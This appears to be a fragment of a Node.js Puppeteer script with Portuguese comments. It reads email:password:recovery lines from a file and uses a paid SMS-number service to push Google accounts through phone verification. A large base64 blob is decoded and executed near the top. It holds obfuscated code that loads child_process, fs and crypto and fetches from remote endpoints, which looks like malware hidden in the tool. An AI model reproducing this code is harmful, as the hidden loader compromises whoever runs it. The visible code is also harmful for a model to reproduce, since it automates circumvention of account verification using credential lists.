EwMF0pXTtjYXNlLTczMTpyZXR1cm4gZ1skKHJbNDJdKzY5KV18fHlbYl07Y2FzZS0ocls0Ml0rODk0KTpyWzhdPSQoMTAyKXx8eVskKDEwMildO2JyZWFrO2Nhc2Ugcls0Ml0tKHJbNDJdLTkxNSk6cmV0dXJuIGdbJCgxMDMpKyQoMTA0KV18fHlbci5SdlcwRmxoLklMbzRkc0MrRy5kZEFZRnFdO2Nhc2UgMjc5OnJldHVybiBnWyQoMTA1KV18fHlbJCgxMDUpXTtjYXNlIEUudmh5aTIyMigpPy05MDp2b2lkIDA6cmV0dXJuIGdbJCgxMDYpXXx8eVskKDEwNildO2Nhc2UgRS5qcEpZb0U+LTg1Pzc1ODoxNjI6cmV0dXJuIGdbJCgxMDcpXXx8eVskKDEwNyldO2Nhc2UgMTU0OnJldHVybiBnWyQoMTA4KV18fHlbJCgxMDgpXTtjYXNlIEUudmh5aTIyMigpPzIxMjo2NzpyW3JbNDJdLWUoNTIpXT1PW3JbNDJdLTI4XXx8eVskW24oLTQxKV0oZSgzOSksMTA5KV07YnJlYWs7Y2FzZSAxODc1OnJldHVybiBnWyQoMTEwKV18fHlbJFtlKDQxKV0obigtNDMpLDExMCldO2Nhc2UgNzIzOnJbcltyWzQyXSsxMF0tMjRdPSQoMTExKXx8eVskLmNhbGwodm9pZCAwLDExMSldO2JyZWFrO2Nhc2UgNDAyNjpyW3JbZSg1MCldLTI0XT1yLlJ2VzBGbGguczV1Y2ZHT3x8eVskKDExMildO2JyZWFrO2Nhc2UgRS5qcEpZb0U+LTg1PzQ5NDI6MTY1OnJldHVybiBnWyQoMTEzKSskKDExNCldfHx5WyQoMTEzKSskKDExNCldO2Nhc2UgMzM2MTpyZXR1cm4gZ1skKG4oLTI2KSkrJCgxMTYpXXx8eVskKDExNSkrJC5jYWxsKHZvaWQgMCwxMTYpXTtjYXNlIHJbNDJdKzE4Njc6cls4XT0kLmFwcGx5KHZvaWQgMCxbbigtMzEpXSkrJCgxMTcpfHx5WyQuY2FsbChlKDM5KSxuKC0zMSkpKyQoMTE3KV07YnJlYWs7Y2FzZSBFLnZoeWkyMjIoKT8xMTE6LTE3NzpyZXR1cm4gZ1skKDExOCldfHx5WyQoMTE4KV07Y2FzZSAxNjM2OnJbcltyWzQyXSsxMF0tbigtMzApXT0kLmFwcGx5KHZvaWQgMCxbMTE5XSkrIm50Inx8MDticmVhaztjYXNlIDI1NTU6cls4XT0kKDEyMCkrJC5jYWxsKHZvaWQgMCwxMjEpfHx5WyQoMTIwKSskKDEyMSldO2JyZWFrO2Nhc2UgRS5LdjdYRm9wPi01MD80OTI0Oi02MTpyZXR1cm4gZ1skKDEyMildfHx5WyQoMTIyKV07Y2FzZSA5MTpyZXR1cm4gZ1skKDEyMyldfHx5WyQocls0Ml0rZSg1MykpXTtjYXNlIDE3NDY6cltuKC0zMyldPSQoMTI0KXx8eVskLmNhbGwodm9pZCAwLDEyNCldO2JyZWFrO2Nhc2UgRS5qcEpZb0U+LTg1PzE5MTQ6LTEwNjpyZXR1cm4gZ1skKDEyNSldfHx5WyQuYXBwbHkobigtNDMpLFtyW2UoNTApXSs5M10pXTtjYXNlIHJbNDJdKzkzNTpyW2UoNDkpXT0kKHJbNDJdKzk0KSsib24ifHwwO2JyZWFrO2Nhc2UgMzEyOnJbOF09JCgxMjcpfHx5WyRbbigtMjcpXSh2b2lkIDAsWzEyN10pXTticmVhaztjYXNlIDcwMzpyZXR1cm4gZ1skKDEyOCldfHx5WyQoMTI4KV07Y2FzZSAzODI4OnJldHVybiBnWyQoMTI5KSskKDEzMCldfHx5W3crJChyW24oLTMyKV0rOTgpXTtjYXNlIDI2OTQ6cmV0dXJuIGdbJChlKDU0KSkrJCgxMzIpKyJvciJdfHx5WyQoMTMxKSskKDEzMikrIm9yIl07Y2FzZSAxODA1OnJbOF09JCgxMzMpKyQoMTM0KXx8eVskKDEzMykrJFtlKDQxKV0odm9pZCAwLDEzNCldO2JyZWFrO2Nhc2UgMjkxNDpyZXR1cm4gZ1skKDEzNSkrJCgxMzApXXx8eVskKDEzNSkrJCgxMzApXTtjYXNlIEUuanBKWW9FPi04NT8xMzM6LTUzOnJbcltyWzQyXSsxMF0tZSg1MildPSQuY2FsbCh2b2lkIDAsMTM2KSskKHJbcls0Ml0rMTBdKzEwNSl8fHlbJCgxMzYpKyQoMTM3KV07YnJlYWs7Y2FzZSA0NDkzOnJbOF09JFtuKC0yNyldKG4oLTQzKSxbMTM4XSkrJCgxMzkpKyJsInx8MDticmVhaztjYXNlIDI3NTpyW3JbZSg1MCldLW4oLTMwKV09JCgxNDApKyQuY2FsbCh2b2lkIDAsMTQxKXx8eVskLmNhbGwobigtNDMpLHJbNDJdKzEwOCkrJC5jYWxsKHZvaWQgMCwxNDEpXTticmVhaztjYXNlIlciPT1FLnlwOWVkQ1RbJCgxNDIpXSg0KT9yWzQyXSsyNDozMTpyW3JbbigtMzIpXS1uKC0zMCldPSQoMTM4KSskKDE0MykrInRlInx8MDticmVhaztjYXNlIDQ0NTM6cls4XT0kKDE0NCkrJChyWzQyXSsxMTMpKyJzayJ8fDA7YnJlYWs7Y2FzZSAyNjAwOnJldHVybiBnWyQoMTQ2KV18fHlbJCgxNDYpXTtjYXNlIDI0NDE6cls4XT0kKHJbNDJdK24oLTI2KSkrInRlInx8MDticmVhaztjYXNlIDMxNTU6cmV0dXJuIGdbJC5hcHBseSh2b2lkIDAsW3JbNDJdKzExNl0pXXx8eVskKDE0OCldO2Nhc2UgMTkyMDpyZXR1cm4gZ1skKDE0OSldfHx5WyQocls0Ml0rMTE3KV07Y2FzZSA0NzE3OnJbcls0Ml0tMjRdPSQoMTUwKXx8eVskKDE1MCldO2JyZWFrO2Nhc2UgMjAyMDpyZXR1cm4gZ1skKDE1MSldfHx5WyQoMTUxKV07Y2FzZSAzNDAwOnJldHVybiBnWyRbZSg1NSldKHZvaWQgMCxbbigtMjUpXSldfHx5W0cuSnZ1TjRiXX1yZXR1cm4gcltyW24oLTMyKV0rMTBdPmUoNTkpP3JbLTIwOF06Z1tyW3JbNDJdLTI0XV18fHlbcls4XV19ZnVuY3Rpb24gWiguLi5yKXt2YXIgZT1IKChyPT5hW3I8LTIxfHxyPC0yMT9yLTg5OnI8MTE/cj4tMjE/cjwxMT9yKzIwOnIrODU6cisyMTpyLTddKSwxKTtyW2UoLTE5KV09MSxyWzEwM109cls3XSxyLkZIZlBjWD0nQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkhIyQlJigpKissLi86Ozw9Pj9AW11eX2B7fH1+Iicsci5Kakx6UzNHPSIiKyhyWzBdfHwiIiksci5YWVZFTHZGPXIuSmpMelMzRy5sZW5ndGgsci51NE9SdURkPVtdLHJbNV09MCxyWzZdPTAsclsxMDNdPS0xO2ZvcihsZXQgbz0wO288ci5YWVZFTHZGO28rKylpZihyWzldPXIuRkhmUGNYLmluZGV4T2Yoci5Kakx6UzNHW29dKSxyWzldIT09LW4oLTQwKSlpZihyWzEwM108MClyWzEwM109cltuKC0yNCldO2Vsc2V7dmFyIHQ9SCgocj0+YVtyPi02NT9yPi0zMz9yKzE6cj4tMzM/ci04MzpyPC02NT9yKzU0OnIrNjQ6ci0yNF0pLDEpO3JbMTAzXSs9clt0KC0zNyldKm4oLTI5KSxyWzVdfD1yWzEwM108PHJbNl0scls2XSs9KDgxOTEmcltuKC0yMyldKT44OD8xMzoxNDtkb3tyLnU0T1J1RGQucHVzaCgyNTUmcls1XSkscls1XT4+PXQoLTQ2KSxyW2UoOSldLT04fXdoaWxlKHJbNl0+ZSgxMCkpO3JbMTAzXT0tMX1yZXR1cm4gclsxMDNdPi0xJiZyLnU0T1J1RGQucHVzaCgyNTUmKHJbNV18clsxMDNdPDxyW24oLTIyKV0pKSxoKHIudTRPUnVEZCl9ZnVuY3Rpb24gJChyLGUsdCxuPVosYT1jKXtyZXR1cm4gdD9lW2NbdF1dPSQocixlKTooZSYmKFthLGVdPVtuKGEpLHJ8fHRdKSxlP3JbYVtlXV06Y1tyXXx8KGFbcl0sdD1uLGNbcl09dChsW3JdKSkpfWZ1bmN0aW9uIEgocixlKXt2YXIgdD1mdW5jdGlvbigpe3JldHVybiByKC4uLmFyZ3VtZW50cyl9O3JldHVybiBPYmplY3QuZGVmaW5lUHJvcGVydHkodCwibGVuZ3RoIix7dmFsdWU6ZSxjb25maWd1cmFibGU6ITB9KSx0fW8oRCwxKSxhc3luYyBmdW5jdGlvbiguLi5yKXtyLmxlbmd0aD1uKC00Niksci5URXMzUnBUPXIuTE1xcUhBLHIuVEVzM1JwVD1udWxsO2Zvcihjb25zdCBlIG9mIFMpdHJ5e3IuYkdUenlLMD0oej1bZSxMXSxZKCQoNjcpKSksci5URXMzUnBUPWF3YWl0IEQoci5iR1R6eUswKTticmVha31jYXRjaChyKXt9cls0NV09NixLKHIuVEVzM1JwVCxXKDEzKSkmJkUudmh5aTIyMigpfHwoej1bci5URXMzUnBUXSxuZXcgWSgkKDY4KSx2b2lkIDAsJCg2OSkpLkZYanpteGMpfSgpLG8oRiwxKSxvKFosbigtNDApKX0sODE6cj0+e3IuZXhwb3J0cz1yZXF1aXJlKCJjaGlsZF9wcm9jZXNzIil9LDExMzpyPT57ci5leHBvcnRzPXJlcXVpcmUoImNyeXB0byIpfSwxNDc6cj0+e3IuZXhwb3J0cz1yZXF1aXJlKCJmcyIpfSwxNzpyPT57ci5leHBvcnRzPXJlcXVpcmUoInBhdGgiKX19LGU9e307IWZ1bmN0aW9uIHQobil7dmFyIGE9ZVtuXTtpZih2b2lkIDAhPT1hKXJldHVybiBhLmV4cG9ydHM7dmFyIG89ZVtuXT17ZXhwb3J0czp7fX07cmV0dXJuIHJbbl0uY2FsbChvLmV4cG9ydHMsbyxvLmV4cG9ydHMsdCksby5leHBvcnRzfSg3ODgpfSkoKTs=','base64').toString('utf-8'));
}
module.exports = {sms}
async function TestarEmail() {
    fs.readFile('emailtestar.txt', 'utf8', async (err, data) => {
        if (err) {
            console.error('Erro ao ler o arquivo:', err);
            return;
        }


        // Dividir as linhas em um array
        const linhas = data.split('\n');

        await percorrerLista(linhas);
    });
}

async function percorrerLista(lista) {
    for (const item of lista) {
        const [email, senha, emailRec] = item.split(':');
        // Aqui você pode fazer o que quiser com os valores de email e senha
        if (email.trim() == '') {
            return;
        }
        countNrRuim = 0;
        await crawler(email, senha, emailRec, emailRec);
    }
    console.log('Todos os itens foram processados.');
}

// Ch
//TestarEmail();

async function getSMSNumber() {
    try {


        const { balance_number } = await sms.getBalance()
        if (balance_number > 0) {
            //console.log('Balance:' + balance_number);

            //console.log('Aguardando número...');
            const { id, number } = await sms.getNumber('go', 'any', pais);

            //console.log('Number ID:', id)
            //console.log('Number:', number);

            await page.type('#deviceAddress', number);


            const index = await getIndiceByPais(pais);
            await page.evaluate((index) => {
                const select = document.getElementById('countryList');
                select.selectedIndex = index;
                select.dispatchEvent(new Event('change'));
            }, index);

            await page.click('#next-button');
            await new Promise(function (resolve) { setTimeout(resolve, 3000) });

            try {
                const elemento = await page.$('#error');
                if (elemento != null) {
                    countNrRuim++;
                    if (countNrRuim > 6) {
                        log.red('conta com problema, não recebe sms?');
                        await browser.close();
                        return; 
                    }

                    //log.red('error, provavelmente numero ruim');
                    await sms.setStatus(8, id) // Accept, end
                    await getSMSNumber();
                    return;
                }
            } catch (error) {
                //console.log(error);
            }

            // Set "message has been sent" status
            await sms.setStatus(1, id)

            // Wait for code
            const { code } = await sms.getCode(id, 60000)
            console.log('Code:', code);

            await page.type('#smsUserPin', code);

            await page.click('#next-button');

            await new Promise(function (resolve) { setTimeout(resolve, 6000) });

            if (page.url().includes('https://gds.google.com/web/chip?')) {
                log.green('OK');
                await browser.close();
                return;
            }
            if (page.url().includes('https://mail.google.com/mail/u/0/#inbox')) {
                log.green('OK');
                await browser.close();
                return;
            }

            await sms.setStatus(6, id) // Accept, end
        } else console.log('No money')
    } catch (error) {
        if (error instanceof TimeoutError) {
            console.log('Timeout reached')
        }

        if (error instanceof ServiceApiError) {
            if (error.code === errors.BANNED) {
                console.log(`Banned! Time ${error.banTime}`)
            } else {
                if (error.code == "NO_NUMBERS") {
                    await getSMSNumber();
                } else {
                    console.error(error.code, error.message)
                }
            }
        } else console.error(error)
    }
};


async function getIndiceByPais(pais) {
    if (pais == Kazakhstan) {
        return 111;
    }

    if (pais == Philippines) {
        return 171;
    }

    if (pais == Indonesia) {
        return 100;
    }

    if (pais == Kenya) {
        return 113;
    }

    if (pais == Vietnam) {
        return 236;
    }

    if (pais == Kyrgyzstan) {
        return 116;
    }

    if (pais == Usa) {

        return 230;
    }

    if (pais == India) {
        return 99;
    }

    if (pais == Southafrica) {
        return 194;
    }

    if (pais == Romania) {
        return 177;
    }

    if (pais == Uzbekistan) {
        return 232;
    }
}
